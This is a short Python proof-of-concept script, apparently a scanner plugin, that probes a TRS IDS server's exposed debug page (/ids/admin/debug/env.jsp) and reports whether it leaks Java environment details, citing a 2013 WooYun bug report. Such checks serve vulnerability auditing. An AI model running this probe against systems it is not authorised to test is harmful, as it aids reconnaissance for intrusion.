#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS ids身份认证信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2013-039729
author: Lucifer
description: 敏感信息泄露。
'''
import sys
import requests
import warnings
def run(url):
        result = ['TRS ids身份认证信息泄露','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ids/admin/debug/env.jsp"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"JavaHome" in req.text and r"java.runtime.name" in req.text and r"java.vm.version" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
